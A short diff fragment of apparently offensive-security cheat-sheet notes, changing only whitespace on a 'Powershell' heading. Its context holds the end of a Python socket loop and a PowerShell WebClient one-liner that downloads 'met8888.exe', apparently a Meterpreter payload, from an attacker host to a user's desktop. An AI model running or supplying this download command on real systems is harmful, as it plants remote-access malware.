@@ -79,7 +79,7 @@ for string in buffer:
    s.recv(1024)  
 s.close()  
 
-****Powershell*** 
+****Powershell***  
 .NET object to download a remote file:  
 
 (new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')  
